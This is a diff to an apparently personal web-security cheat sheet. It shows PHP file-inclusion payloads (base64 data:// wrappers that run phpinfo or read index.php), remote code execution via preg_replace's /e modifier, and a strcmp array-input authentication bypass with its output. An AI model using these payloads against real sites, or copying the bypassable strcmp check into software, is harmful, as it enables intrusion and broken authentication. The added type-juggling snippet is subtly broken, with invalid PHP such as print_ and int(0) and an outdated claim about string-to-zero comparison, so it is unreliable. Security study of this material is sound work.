@@ -68,16 +68,46 @@ Example of payloads
 | <?php phpinfo();?>             | data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+                 |
 | <?php readfile('index.php');?> | data://text/plain;base64,PD9waHAgcmVhZGZpbGUoJ2luZGV4LnBocCcpOz8+ |
 
-
 ** Remote Code Execution
 
-*** preg_replace() :PHP:
+*** The =preg_replace()= function :PHP:
 
-Cette fonction permet d'exécuter du code PHP :
+This function allows to execute PHP code:
 
 #+BEGIN_SRC php
 preg_replace("/string/e", "phpinfo();", "une string");
 #+END_SRC
+
+** Type Juggling
+*** PHP
+
+In PHP, ==== is a loose comparison. For example :
+
+#+BEGIN_SRC php :results output
+print_("000" == int(0)); // TRUE
+print_("0e12" == int(0)); // TRUE
+print_("1abc" == int(1)); // TRUE
+print_("abc" == int(0)); // TRUE !! Any string is equal to int(0)
+#+END_SRC
+
+#+RESULTS:
+
+
+The function =strcmp= can be exploited too :
+
+In the following example, we can use the fact that comparing a string to an array using the function =strcmp= returns =NULL=.
+
+#+BEGIN_SRC php
+$user_input = array();
+
+
+if (!strcmp($user_input, "Password")) {
+    echo "Authenticated !";
+}
+#+END_SRC
+
+#+RESULTS:
+: Authenticated !
 
 * Tools
 ** Zaproxy
